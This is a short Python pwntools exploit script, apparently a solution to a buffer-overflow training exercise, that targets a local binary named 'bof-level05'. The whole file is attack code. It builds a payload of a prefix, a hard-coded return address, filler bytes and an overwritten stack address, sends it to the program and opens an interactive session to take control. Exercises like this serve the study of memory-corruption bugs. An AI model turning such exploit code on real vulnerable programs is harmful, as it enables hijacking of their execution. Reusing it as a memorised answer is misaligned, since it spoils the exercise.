#!/usr/bin/env python
from pwn import *

#####################################################################################
payload = 'zzzz' + '\xe6\x84\x04\x08' + 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffff' + '\xb0\xd4\xff\xff'
#####################################################################################

context.terminal = ['tmux', 'splitw', '-h']

target = process('./bof-level05')
#target = process('./bof-level05', setuid=False)
#gdb.attach(target, 'b *receive_input +48 \n c')

target.recvline()

target.send(payload) 

target.interactive()
